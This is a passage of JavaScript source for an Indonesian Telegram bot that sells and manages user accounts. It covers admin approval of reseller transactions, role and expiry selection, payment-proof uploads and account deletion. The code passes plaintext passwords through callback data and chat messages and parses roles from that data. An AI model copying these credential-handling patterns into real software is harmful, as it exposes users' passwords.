        const transactionId = data.replace("accept_trx_", "");
        const transaction = pendingTransactions[transactionId];
        
        if (!transaction) {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: "❌ Transaksi tidak ditemukan atau sudah kadaluarsa!",
                show_alert: true
            });
            
            try {
                await bot.editMessageCaption(
                    "❌ Transaksi tidak ditemukan atau sudah kadaluarsa!",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: "HTML",
                        reply_markup: { inline_keyboard: [] }
                    }
                );
            } catch (e) {}
            
            return;
        }
        
        // Cek apakah user adalah admin (owner/developer)
        if (!isAdmin(userId)) {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: "❌ Hanya Owner dan Developer yang bisa mengkonfirmasi transaksi!",
                show_alert: true
            });
            return;
        }
        
        // Cek apakah transaksi sudah dikonfirmasi sebelumnya
        if (transaction.status === 'approved') {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: "⚠️ Transaksi ini sudah dikonfirmasi sebelumnya!",
                show_alert: true
            });
            
            try {
                await bot.editMessageReplyMarkup(
                    { inline_keyboard: [] },
                    {
                        chat_id: chatId,
                        message_id: messageId
                    }
                );
            } catch (e) {}
            
            return;
        }
        
        if (transaction.status === 'rejected') {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: "⚠️ Transaksi ini sudah ditolak sebelumnya!",
                show_alert: true
            });
            
            try {
                await bot.editMessageReplyMarkup(
                    { inline_keyboard: [] },
                    {
                        chat_id: chatId,
                        message_id: messageId
                    }
                );
            } catch (e) {}
            
            return;
        }
        
        // Update status transaksi
        transaction.status = 'approved';
        transaction.approvedBy = userId;
        transaction.approvedAt = new Date().toISOString();
        
        // Pastikan selectedRole memiliki nilai default
        const safeSelectedRole = transaction.selectedRole || 'member';
        
        // Simpan akun ke database
        const result = saveUserToDatabase(
            transaction.username, 
            transaction.password, 
            safeSelectedRole, 
            transaction.days, 
            transaction.creatorId,
            transaction.creatorId
        );
        
        if (result.success) {
            trackAccountCreation(transaction.creatorId, safeSelectedRole);
        }
        
        // Hapus dari pending buyar
        if (userPendingBuyar[transaction.creatorId]) {
            delete userPendingBuyar[transaction.creatorId];
        }
        
        // Kirim notifikasi ke pembeli
        try {
            const accountTypeText = transaction.inputType || (transaction.days === 99999 ? "PERMANEN" : `${transaction.days} hari`);
            
            const successMessage = `
<b>✅ AKUN ANDA TELAH DIKONFIRMASI!</b>

━━━━━━━━━━━━━━━━━━━
<b>DETAIL AKUN</b>

👤 Username: <code>${transaction.username}</code>
🔒 Password: <code>${transaction.password}</code>
🔥 Role: <b>${safeSelectedRole.toUpperCase()}</b>
⏰ Expired: ${accountTypeText}

━━━━━━━━━━━━━━━━━━━
<b>✅ STATUS: AKTIF</b>

Terima kasih telah bertransaksi dengan GupongOfficial!
`;

            await bot.sendMessage(transaction.creatorId, successMessage, {
                parse_mode: "HTML"
            });
        } catch (e) {
            console.log("Gagal kirim notifikasi ke pembeli:", e.message);
        }
        
        // Update pesan konfirmasi untuk admin
        try {
            const adminName = callbackQuery.from.first_name || callbackQuery.from.username || 'Admin';
            const accountTypeText = transaction.inputType || (transaction.days === 99999 ? "PERMANEN" : `${transaction.days} hari`);
            
            await bot.editMessageCaption(
                `✅ <b>TRANSAKSI DITERIMA</b>\n\n` +
                `ID Transaksi: <code>${transactionId}</code>\n` +
                `Akun <b>${transaction.username}</b> (${safeSelectedRole.toUpperCase()}) telah diaktifkan.\n` +
                `Expired: ${accountTypeText}\n` +
                `Dikonfirmasi oleh: ${adminName}\n\n` +
                `<i>Status: SUDAH DIKONFIRMASI</i>`,
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [] }
                }
            );
        } catch (e) {
            console.log("Gagal edit pesan:", e.message);
        }
        
        // Hapus dari pending transactions
        delete pendingTransactions[transactionId];
        
        bot.answerCallbackQuery(callbackQuery.id, {
            text: "✅ Transaksi diterima, akun telah diaktifkan!",
            show_alert: false
        });
        
        return;
    }
    
    // Handler untuk REJECT TRANSACTION
    if (data.startsWith("reject_trx_")) {
        const transactionId = data.replace("reject_trx_", "");
        const transaction = pendingTransactions[transactionId];
        
        if (!transaction) {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: "❌ Transaksi tidak ditemukan atau sudah kadaluarsa!",
                show_alert: true
            });
            
            try {
                await bot.editMessageCaption(
                    "❌ Transaksi tidak ditemukan atau sudah kadaluarsa!",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: "HTML",
                        reply_markup: { inline_keyboard: [] }
                    }
                );
            } catch (e) {}
            
            return;
        }
        
        // Cek apakah user adalah admin (owner/developer)
        if (!isAdmin(userId)) {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: "❌ Hanya Owner dan Developer yang bisa menolak transaksi!",
                show_alert: true
            });
            return;
        }
        
        // Cek apakah transaksi sudah dikonfirmasi sebelumnya
        if (transaction.status === 'approved') {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: "⚠️ Transaksi ini sudah dikonfirmasi! Tidak bisa ditolak.",
                show_alert: true
            });
            
            try {
                await bot.editMessageReplyMarkup(
                    { inline_keyboard: [] },
                    {
                        chat_id: chatId,
                        message_id: messageId
                    }
                );
            } catch (e) {}
            
            return;
        }
        
        if (transaction.status === 'rejected') {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: "⚠️ Transaksi ini sudah ditolak sebelumnya!",
                show_alert: true
            });
            
            try {
                await bot.editMessageReplyMarkup(
                    { inline_keyboard: [] },
                    {
                        chat_id: chatId,
                        message_id: messageId
                    }
                );
            } catch (e) {}
            
            return;
        }
        
        transaction.status = 'rejected';
        transaction.rejectedBy = userId;
        transaction.rejectedAt = new Date().toISOString();
        
        // Hapus dari pending buyar
        if (userPendingBuyar[transaction.creatorId]) {
            delete userPendingBuyar[transaction.creatorId];
        }
        
        // Kirim notifikasi ke pembeli
        try {
            const rejectMessage = `
<b>❌ TRANSAKSI DITOLAK</b>

ID Transaksi: <code>${transactionId}</code>
Akun: <b>${transaction.username}</b>

Mohon maaf, transaksi Anda ditolak. 
Silahkan hubungi admin untuk informasi lebih lanjut.

Terima kasih.
`;

            await bot.sendMessage(transaction.creatorId, rejectMessage, {
                parse_mode: "HTML"
            });
        } catch (e) {
            console.log("Gagal kirim notifikasi ke pembeli:", e.message);
        }
        
        // Update pesan konfirmasi untuk admin
        try {
            const adminName = callbackQuery.from.first_name || callbackQuery.from.username || 'Admin';
            
            await bot.editMessageCaption(
                `❌ <b>TRANSAKSI DITOLAK</b>\n\n` +
                `ID Transaksi: <code>${transactionId}</code>\n` +
                `Akun <b>${transaction.username}</b> tidak jadi diaktifkan.\n` +
                `Ditolak oleh: ${adminName}\n\n` +
                `<i>Status: DITOLAK</i>`,
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [] }
                }
            );
        } catch (e) {
            console.log("Gagal edit pesan:", e.message);
        }
        
        delete pendingTransactions[transactionId];
        
        bot.answerCallbackQuery(callbackQuery.id, {
            text: "❌ Transaksi ditolak",
            show_alert: false
        });
        
        return;
    }
    
    // Handler untuk CUSTOM EXPIRED
    if (data.startsWith("custom_")) {
        const parts = data.split("_");
        if (parts.length >= 4) {
            const username = parts[1];
            const password = parts[2];
            const telegramId = parts[3];
            
            const userRole = getUserRole(userId);
            const allowedRoles = ['owner', 'developer', 'vip'];
            
            if (!allowedRoles.includes(userRole)) {
                bot.answerCallbackQuery(callbackQuery.id, {
                    text: "❌ Hanya Owner, Developer dan VIP yang bisa menggunakan Custom Expired!",
                    show_alert: true
                });
                
                const infoMsg = await bot.sendMessage(chatId, 
                    "⚠️ *Akses Ditolak*\n\n" +
                    "Custom Expired hanya tersedia untuk:\n" +
                    "• 👑 Owner\n" +
                    "• 👨‍💻 Developer\n" +
                    "• ⭐ VIP\n\n" +
                    "Reseller hanya bisa menggunakan pilihan expired yang sudah tersedia.",
                    { parse_mode: "Markdown" }
                );
                
                setTimeout(() => {
                    bot.deleteMessage(chatId, infoMsg.message_id).catch(() => {});
                }, 5000);
                return;
            }
            
            try {
                await bot.deleteMessage(chatId, messageId);
            } catch (e) {}
            
            userPendingData[userId] = { 
                username, 
                password, 
                telegramId,
                timestamp: Date.now(),
                userRole: userRole,
                step: 'custom_expired'
            };
            
            const customMessage = `
<b>🎯 CUSTOM EXPIRED - ${userRole.toUpperCase()} ONLY</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>

✅ <b>Anda memiliki akses Custom Expired!</b>

<b>Silahkan kirim jumlah waktu dengan format:</b>

📅 <b>Format:</b>
• <code>1.5h</code> → 1.5 Jam
• <code>15h</code> → 15 Jam
• <code>0.5d</code> → 12 Jam
• <code>45d</code> → 45 Hari
• <code>2.5w</code> → 2.5 Minggu
• <code>3.5m</code> → 3.5 Bulan
• <code>2.5y</code> → 2.5 Tahun
• <code>perm</code> → PERMANEN

📌 <b>Contoh:</b>
<code>6h</code> → 6 jam
<code>0.25d</code> → 6 jam
<code>90d</code> → 90 hari
<code>2.5m</code> → 2.5 bulan
<code>0.5y</code> → 6 bulan
<code>perm</code> → PERMANEN

⚠️ <b>Batas:</b>
• VIP: Maksimal 10 tahun
• Owner/Developer: Tidak terbatas

<i>Gunakan titik (.) untuk desimal. Balas pesan ini dengan format di atas. Pesan ini akan otomatis terhapus dalam 2 menit.</i>
`;
            
            const sentMsg = await bot.sendMessage(chatId, customMessage, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "🔙 KEMBALI KE PILIHAN EXPIRED",
                                callback_data: `back_expired_${username}_${password}_${telegramId}`
                            }
                        ]
                    ]
                }
            });
            
            userPendingData[userId].messageId = sentMsg.message_id;
            
            setTimeout(() => {
                bot.deleteMessage(chatId, sentMsg.message_id).catch(() => {});
                if (userPendingData[userId] && userPendingData[userId].step === 'custom_expired') {
                    delete userPendingData[userId];
                }
            }, 120000);
        }
        
        return;
    }
    
    // Handler untuk BACK EXPIRED
    if (data.startsWith("back_expired_")) {
        const parts = data.split("_");
        if (parts.length >= 5) {
            const username = parts[2];
            const password = parts[3];
            const telegramId = parts[4];
            
            if (userPendingData[userId]) {
                delete userPendingData[userId];
            }
            
            try {
                await bot.deleteMessage(chatId, messageId);
            } catch (e) {}
            
            const detailMessage = `
<b>📋 Detail Akun</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
⏰ Expired: <i>Pilih di bawah</i>
🔥 Role: Member

<b>Pilihan Expired Akun</b>
`;
            
            const userRole = getUserRole(userId);
            const expiredOptions = [];
            
            if (userRole === 'reseller' || userRole === 'owner' || userRole === 'vip' || userRole === 'developer') {
                expiredOptions.push(
                    { text: "7 HARI", days: 7 },
                    { text: "1 BULAN", days: 30 }
                );
            }
            
            if (userRole === 'owner' || userRole === 'developer') {
                expiredOptions.push(
                    { text: "2 BULAN", days: 60 },
                    { text: "3 BULAN", days: 90 },
                    { text: "4 BULAN", days: 120 },
                    { text: "✨ PERMANEN", days: 99999 }
                );
            }
            
            const keyboard = {
                inline_keyboard: []
            };
            
            for (let i = 0; i < expiredOptions.length; i += 2) {
                const row = [];
                row.push({
                    text: expiredOptions[i].text,
                    callback_data: `expired_${username}_${password}_${telegramId}_${expiredOptions[i].days}`
                });
                
                if (i + 1 < expiredOptions.length) {
                    row.push({
                        text: expiredOptions[i + 1].text,
                        callback_data: `expired_${username}_${password}_${telegramId}_${expiredOptions[i + 1].days}`
                    });
                }
                
                keyboard.inline_keyboard.push(row);
            }
            
            if (userRole === 'vip' || userRole === 'owner' || userRole === 'developer') {
                keyboard.inline_keyboard.push([
                    {
                        text: "🎯 CUSTOM EXPIRED",
                        callback_data: `custom_${username}_${password}_${telegramId}`
                    }
                ]);
            }
            
            keyboard.inline_keyboard.push([
                {
                    text: "❌ BATALKAN",
                    callback_data: "cancel_creation"
                }
            ]);
            
            const sentMsg = await bot.sendMessage(chatId, detailMessage, {
                parse_mode: "HTML",
                reply_markup: keyboard
            });
            
            if (userRole === 'vip' || userRole === 'owner' || userRole === 'developer') {
                setTimeout(() => {
                    bot.deleteMessage(chatId, sentMsg.message_id).catch(() => {});
                }, 120000);
            }
        }
        
        return;
    }
    
    // Handler untuk EXPIRED
    if (data.startsWith("expired_")) {
        const parts = data.split("_");
        if (parts.length >= 5) {
            const username = parts[1];
            const password = parts[2];
            const telegramId = parts[3];
            const days = parseInt(parts[4]);
            
            try {
                await bot.deleteMessage(chatId, messageId);
            } catch (e) {}
            
            userPendingData[userId] = {
                username,
                password,
                telegramId,
                days,
                userRole,
                step: 'select_role',
                creatorName: callbackQuery.from.first_name || callbackQuery.from.username || 'Unknown',
                creatorId: userId
            };
            
            showRoleSelectionWithLimit(chatId, username, password, telegramId, days, userRole, userId, "");
        }
        
        return;
    }
    
    // Handler untuk ROLE
    if (data.startsWith("role_")) {
        const parts = data.split("_");
        if (parts.length >= 6) {
            const username = parts[1];
            const password = parts[2];
            const telegramId = parts[3];
            const days = parseInt(parts[4]);
            const selectedRole = parts[5] || 'member'; // DEFAULT VALUE
            const inputType = decodeURIComponent(parts[6] || "");
            
            // Validasi role
            if (!canCreateRole(userId, selectedRole)) {
                bot.answerCallbackQuery(callbackQuery.id, {
                    text: `❌ Anda sudah membuat akun ${selectedRole.toUpperCase()} sebelumnya! Hanya bisa buat 1x.`,
                    show_alert: true
                });
                return;
            }
            
            try {
                await bot.deleteMessage(chatId, messageId);
            } catch (e) {}
            
            // SIMPAN DATA PENDING
            userPendingData[userId] = {
                username,
                password,
                telegramId,
                days,
                selectedRole,
                inputType,
                userRole,
                step: 'processing',
                creatorName: callbackQuery.from.first_name || callbackQuery.from.username || 'Unknown',
                creatorId: userId,
                timestamp: Date.now()
            };
            
            // JIKA ADMIN (OWNER/DEVELOPER) - LANGSUNG BUAT AKUN TANPA BUKTI
            if (userRole === 'owner' || userRole === 'developer') {
                try {
                    console.log(`[DEBUG] Admin (${userRole}) creating account directly: ${username}`);
                    
                    // Cek username
                    const db = loadDatabaseCached();
                    if (db.some(u => u.username.toLowerCase() === username.toLowerCase())) {
                        bot.sendMessage(chatId, 
                            `❌ Username <code>${username}</code> sudah digunakan!`,
                            { parse_mode: "HTML" }
                        );
                        delete userPendingData[userId];
                        return;
                    }
                    
                    // Simpan akun
                    const result = saveUserToDatabase(username, password, selectedRole, days, telegramId, userId);
                    
                    if (result.success) {
                        trackAccountCreation(userId, selectedRole);
                        
                        const daysText = inputType || (days === 99999 ? "PERMANEN" : `${days} hari`);
                        
                        const successMessage = `
<b>✅ AKUN BERHASIL DIBUAT!</b>

━━━━━━━━━━━━━━━━━━━
<b>DETAIL AKUN</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
🔥 Role: <b>${selectedRole.toUpperCase()}</b>
⏰ Expired: ${daysText}

━━━━━━━━━━━━━━━━━━━
<i>Akun langsung aktif (Admin Privilege).</i>
`;

                        bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
                    }
                    
                    delete userPendingData[userId];
                    
                } catch (error) {
                    console.log(`[ERROR] Admin account error:`, error);
                    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`, {
                        parse_mode: "HTML"
                    });
                    delete userPendingData[userId];
                }
                
                return;
            }
            
            // JIKA VIP - LANGSUNG BUAT AKUN TANPA BUKTI
            if (userRole === 'vip') {
                try {
                    console.log(`[DEBUG] VIP creating account directly: ${username}`);
                    
                    // Cek username
                    const db = loadDatabaseCached();
                    if (db.some(u => u.username.toLowerCase() === username.toLowerCase())) {
                        bot.sendMessage(chatId, 
                            `❌ Username <code>${username}</code> sudah digunakan!`,
                            { parse_mode: "HTML" }
                        );
                        delete userPendingData[userId];
                        return;
                    }
                    
                    // Simpan akun
                    const result = saveUserToDatabase(username, password, selectedRole, days, telegramId, userId);
                    
                    if (result.success) {
                        trackAccountCreation(userId, selectedRole);
                        
                        const daysText = inputType || (days === 99999 ? "PERMANEN" : `${days} hari`);
                        
                        const successMessage = `
<b>✅ AKUN BERHASIL DIBUAT!</b>

━━━━━━━━━━━━━━━━━━━
<b>DETAIL AKUN</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
🔥 Role: <b>${selectedRole.toUpperCase()}</b>
⏰ Expired: ${daysText}

━━━━━━━━━━━━━━━━━━━
<i>Akun langsung aktif (VIP Privilege).</i>
`;

                        bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
                    }
                    
                    delete userPendingData[userId];
                    
                } catch (error) {
                    console.log(`[ERROR] VIP account error:`, error);
                    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`, {
                        parse_mode: "HTML"
                    });
                    delete userPendingData[userId];
                }
                
                return;
            }
            
            // JIKA RESELLER - HARUS UPLOAD BUKTI
            if (userRole === 'reseller') {
                // Cek apakah user sudah memiliki transaksi buyar pending
                if (hasPendingBuyarTransaction(userId)) {
                    bot.sendMessage(chatId, 
                        "❌ Anda masih memiliki transaksi BUYAR yang pending!\n\n" +
                        "Tunggu hingga transaksi sebelumnya dikonfirmasi oleh admin sebelum membuat transaksi BUYAR baru.",
                        { parse_mode: "HTML" }
                    );
                    
                    delete userPendingData[userId];
                    return;
                }
                
                // Minta bukti foto
                userPendingData[userId].step = 'waiting_proof';
                
                const daysText = inputType || (days === 99999 ? "PERMANEN" : `${days} hari`);
                
                const proofMessage = `
<b>📸 KIRIMKAN BUKTI TRANSAKSI</b>

Silahkan kirimkan 1 (satu) foto bukti transaksi Anda.

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
🔥 Role: <b>${selectedRole.toUpperCase()}</b>
⏰ Expired: ${daysText}

<i>Kirim foto bukti transfer/transaksi. Pesan ini akan otomatis terhapus dalam 2 menit.</i>
`;

                bot.sendMessage(chatId, proofMessage, { parse_mode: "HTML" }).then(sentMsg => {
                    if (userPendingData[userId]) {
                        userPendingData[userId].messageId = sentMsg.message_id;
                    }
                    
                    // Auto delete setelah 2 menit
                    setTimeout(() => {
                        if (userPendingData[userId] && userPendingData[userId].step === 'waiting_proof') {
                            bot.deleteMessage(chatId, sentMsg.message_id).catch(() => {});
                            bot.sendMessage(chatId, "⏰ Waktu pengiriman bukti habis. Silahkan ulangi dari awal.");
                            delete userPendingData[userId];
                        }
                    }, 120000);
                });
                
                return;
            }
            
            // Jika role tidak dikenal
            bot.sendMessage(chatId, "❌ Role tidak valid!", { parse_mode: "HTML" });
            delete userPendingData[userId];
        }
        
        return;
    }
    
    // Handler untuk BUAT AKUN PRIBADI
    if (data === "create_personal") {
        try {
            await bot.deleteMessage(chatId, messageId);
        } catch (e) {}
        
        const userRole = getUserRole(userId);
        
        if (!userRole) {
            bot.sendMessage(chatId, "❌ Anda tidak memiliki akses untuk membuat akun!");
            return;
        }
        
        // Cek limit untuk non-admin
        if (userRole !== 'owner' && userRole !== 'developer') {
            if (accountCreationTracker[userId] && accountCreationTracker[userId].hasCreatedPersonal) {
                bot.sendMessage(chatId, 
                    "❌ Anda sudah membuat akun PRIBADI sebelumnya! Hanya bisa membuat 1x akun pribadi.",
                    { parse_mode: "HTML" }
                );
                return;
            }
        }
        
        const instructionMessage = `
<b>📝 BUAT AKUN PRIBADI</b>

Silahkan kirimkan username dan password dengan format:

<code>username|password</code>

Contoh: <code>johndoe|rahasia123</code>

📌 <b>Informasi:</b>
• Role: <b>${userRole.toUpperCase()}</b>
• Expired: <b>PERMANEN</b>
• Limit: ${userRole === 'owner' || userRole === 'developer' ? 'Tidak terbatas' : '1x saja'}

<i>Pesan ini akan otomatis terhapus dalam 2 menit.</i>
`;

        const sentMsg = await bot.sendMessage(chatId, instructionMessage, {
            parse_mode: "HTML"
        });
        
        setTimeout(() => {
            bot.deleteMessage(chatId, sentMsg.message_id).catch(() => {});
        }, 120000);
        
        return;
    }
    
    // Tambahkan di bagian callback_query handler, setelah handler create_personal

// Perbaiki handler DELETE AKUN PRIBADI
if (data === "delete_personal") {
    const userId = callbackQuery.from.id;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    
    try {
        await bot.deleteMessage(chatId, messageId);
    } catch (e) {}
    
    // Cek role user
    const userRole = getUserRole(userId);
    
    if (!userRole) {
        const errorMsg = await bot.sendMessage(chatId, 
            "❌ Anda tidak memiliki akun yang terdaftar!",
            { parse_mode: "HTML" }
        );
        setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 5000);
        return;
    }
    
    // Cari akun di database dengan telegramId
    const db = loadDatabaseCached();
    const userAccount = db.find(u => u.telegramId === userId);
    
    if (!userAccount) {
        const errorMsg = await bot.sendMessage(chatId, 
            "❌ Akun pribadi Anda tidak ditemukan di database!",
            { parse_mode: "HTML" }
        );
        setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 5000);
        return;
    }
    
    // Cek apakah akun sudah expired
    const expiredDate = new Date(userAccount.expiredDate);
    const now = new Date();
    const isExpired = expiredDate < now;
    
    // PERBAIKAN: FULL UPDATE bisa menghapus akun sendiri (meskipun belum expired)
    if (!isExpired && userRole !== 'owner' && userRole !== 'developer' && userRole !== 'full_update') {
        const daysLeft = Math.ceil((expiredDate - now) / (1000 * 60 * 60 * 24));
        const errorMsg = await bot.sendMessage(chatId, 
            `❌ Akun Anda masih aktif!\n\n` +
            `👤 Username: <code>${userAccount.username}</code>\n` +
            `⏰ Sisa masa aktif: ${daysLeft} hari\n` +
            `📅 Expired: ${userAccount.expiredDate}\n\n` +
            `Akun hanya bisa dihapus jika sudah EXPIRED.\n` +
            `Gunakan /start untuk membuat akun baru setelah expired.`,
            { parse_mode: "HTML" }
        );
        setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 10000);
        return;
    }
    
    // Jika akun expired ATAU user adalah owner/developer/full_update, hapus
    if (isExpired || userRole === 'owner' || userRole === 'developer' || userRole === 'full_update') {
        // Hapus akun dari database
        const username = userAccount.username;
        const index = db.findIndex(u => u.username === username);
        
        if (index !== -1) {
            db.splice(index, 1);
            saveDatabaseCached(db);
            
            // Hapus dari keyList.json
            try {
                const keyList = loadKeyList();
                const filteredKeyList = keyList.filter(k => k.username !== username);
                saveKeyList(filteredKeyList);
            } catch (e) {}
            
            // Hapus tracking
            removeAccountTracking(userId);
            
            // Kirim notifikasi sukses
            let successMessage = `
✅ <b>AKUN PRIBADI BERHASIL DIHAPUS!</b>

👤 Username: <code>${username}</code>
👑 Role: ${userRole.toUpperCase()}

Anda sekarang dapat membuat akun pribadi baru dengan menekan tombol <b>BUAT AKUN PRIBADI</b>.

📌 <i>Akun lama akan langsung terhapus dari sistem.</i>
`;

            const successMsg = await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
            
            setTimeout(() => {
                bot.deleteMessage(chatId, successMsg.message_id).catch(() => {});
            }, 10000);
            
            // Log ke file
            const logLine = `[${new Date().toISOString()}] DELETE PERSONAL: ${userId} (${userRole}) deleted ${username}\n`;
            fs.appendFileSync('logUser.txt', logLine);
        } else {
            const errorMsg = await bot.sendMessage(chatId, 
                "❌ Gagal menghapus akun. Data tidak ditemukan!",
                { parse_mode: "HTML" }
            );
            setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 5000);
        }
    } else {
        // Fallback jika kondisi tidak terpenuhi
        const errorMsg = await bot.sendMessage(chatId, 
            "❌ Akun tidak dapat dihapus. Hubungi admin jika ada kendala.",
            { parse_mode: "HTML" }
        );
        setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 5000);
    }
    
    return;
}
    
    // Handler untuk CANCEL CREATION
    if (data === "cancel_creation") {
        if (userPendingData[userId]) {
            delete userPendingData[userId];
        }
        
        try {
            await bot.deleteMessage(chatId, messageId);
        } catch (e) {}
        
        const cancelMsg = await bot.sendMessage(chatId, "❌ Pembuatan akun dibatalkan.", {
            reply_markup: {
                remove_keyboard: true
            }
        });
        
        setTimeout(() => {
            bot.deleteMessage(chatId, cancelMsg.message_id).catch(() => {});
        }, 5000);
        
        return;
    }
});

    
function showAccountTypeSelection(chatId, username, password, telegramId, days, creatorRole, inputType = "", userId, selectedRole = 'member') {
    const daysText = inputType || (days === 99999 ? "PERMANEN" : `${days} hari`);
    
    // Jika creator adalah OWNER atau DEVELOPER, langsung buat akun tanpa pilihan
    if (creatorRole === 'owner' || creatorRole === 'developer') {
        // Langsung proses pembuatan akun
        try {
            console.log(`[DEBUG] Owner/Developer creating account directly: ${username}`);
            
            // Cek apakah username sudah digunakan
            const db = loadDatabaseCached();
            if (db.some(u => u.username.toLowerCase() === username.toLowerCase())) {
                bot.sendMessage(chatId, 
                    `❌ Username <code>${username}</code> sudah digunakan!`,
                    { parse_mode: "HTML" }
                );
                return;
            }
            
            // Simpan akun ke database langsung aktif
            const result = saveUserToDatabase(username, password, selectedRole, days, telegramId, userId);
            
            if (result.success) {
                trackAccountCreation(userId, selectedRole);
                
                const successMessage = `
<b>✅ AKUN BERHASIL DIBUAT!</b>

━━━━━━━━━━━━━━━━━━━
<b>DETAIL AKUN</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
🔥 Role: <b>${selectedRole.toUpperCase()}</b>
⏰ Expired: ${daysText}

━━━━━━━━━━━━━━━━━━━
<i>Akun langsung aktif (Admin Privilege).</i>
`;

                bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
            }
            
            delete userPendingData[userId];
            return;
            
        } catch (error) {
            console.log(`[ERROR] Admin account error:`, error);
            bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`, {
                parse_mode: "HTML"
            });
            return;
        }
    }
    
    // Jika creator adalah VIP, langsung buat akun
    if (creatorRole === 'vip') {
        try {
            console.log(`[DEBUG] VIP creating account directly: ${username}`);
            
            // Cek apakah username sudah digunakan
            const db = loadDatabaseCached();
            if (db.some(u => u.username.toLowerCase() === username.toLowerCase())) {
                bot.sendMessage(chatId, 
                    `❌ Username <code>${username}</code> sudah digunakan!`,
                    { parse_mode: "HTML" }
                );
                return;
            }
            
            // Simpan akun ke database langsung aktif
            const result = saveUserToDatabase(username, password, selectedRole, days, telegramId, userId);
            
            if (result.success) {
                trackAccountCreation(userId, selectedRole);
                
                const successMessage = `
<b>✅ AKUN BERHASIL DIBUAT!</b>

━━━━━━━━━━━━━━━━━━━
<b>DETAIL AKUN</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
🔥 Role: <b>${selectedRole.toUpperCase()}</b>
⏰ Expired: ${daysText}

━━━━━━━━━━━━━━━━━━━
<i>Akun langsung aktif (VIP Privilege).</i>
`;

                bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
            }
            
            delete userPendingData[userId];
            return;
            
        } catch (error) {
            console.log(`[ERROR] VIP account error:`, error);
            bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`, {
                parse_mode: "HTML"
            });
            return;
        }
    }
    
    // Jika creator adalah RESELLER, minta bukti foto
    if (creatorRole === 'reseller') {
        // Cek apakah user sudah memiliki transaksi buyar pending
        if (hasPendingBuyarTransaction(userId)) {
            bot.sendMessage(chatId, 
                "❌ Anda masih memiliki transaksi BUYAR yang pending!\n\n" +
                "Tunggu hingga transaksi sebelumnya dikonfirmasi oleh admin sebelum membuat transaksi BUYAR baru.",
                { parse_mode: "HTML" }
            );
            
            delete userPendingData[userId];
            return;
        }
        
        // BUYAR - minta bukti foto
        userPendingData[userId] = {
            username,
            password,
            telegramId,
            days,
            selectedRole,
            inputType,
            step: 'waiting_proof',
            creatorName: "User",
            creatorId: userId,
            messageId: null,
            timestamp: Date.now()
        };
        
        // Kirim pesan minta bukti
        const proofMessage = `
<b>📸 KIRIMKAN BUKTI TRANSAKSI</b>

Silahkan kirimkan 1 (satu) foto bukti transaksi Anda.

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
🔥 Role: <b>${selectedRole.toUpperCase()}</b>
⏰ Expired: ${inputType || (days === 99999 ? "PERMANEN" : `${days} hari`)}

<i>Kirim foto bukti transfer/transaksi. Pesan ini akan otomatis terhapus dalam 2 menit.</i>
`;

        bot.sendMessage(chatId, proofMessage, { parse_mode: "HTML" }).then(sentMsg => {
            // Simpan messageId
            if (userPendingData[userId]) {
                userPendingData[userId].messageId = sentMsg.message_id;
            }
            
            // Auto delete setelah 2 menit
            setTimeout(() => {
                if (userPendingData[userId] && userPendingData[userId].step === 'waiting_proof') {
                    bot.deleteMessage(chatId, sentMsg.message_id).catch(() => {});
                    bot.sendMessage(chatId, "⏰ Waktu pengiriman bukti habis. Silahkan ulangi dari awal.");
                    delete userPendingData[userId];
                }
            }, 120000);
        });
        
        return;
    }
}

// Fungsi untuk handle pembuatan akun dengan role yang sesuai dan limit
function handleCreateAccount(chatId, username, password, telegramId, days, creatorRole, inputType = "") {
    const creatorId = telegramId; // ID creator
    
    // Tampilkan pilihan role dengan limit
    showRoleSelectionWithLimit(chatId, username, password, telegramId, days, creatorRole, creatorId, inputType);
}

// Fungsi untuk menampilkan pilihan role dengan limit
function showRoleSelectionWithLimit(chatId, username, password, telegramId, days, creatorRole, creatorId, inputType = "") {
    const daysText = inputType || (days === 99999 ? "PERMANEN" : `${days} hari`);
    
    const roleMessage = `
<b>🎯 Pilih Role Akun</b>

━━━━━━━━━━━━━━━━━━━
<b>DETAIL AKUN</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
⏰ Expired: ${daysText}

━━━━━━━━━━━━━━━━━━━
<i>Pilih role untuk akun baru:</i>
`;
    
    const keyboard = {
        inline_keyboard: []
    };
    
    // SELALU tampilkan MEMBER (unlimited untuk semua role)
    const memberButton = {
        text: "👤 MEMBER",
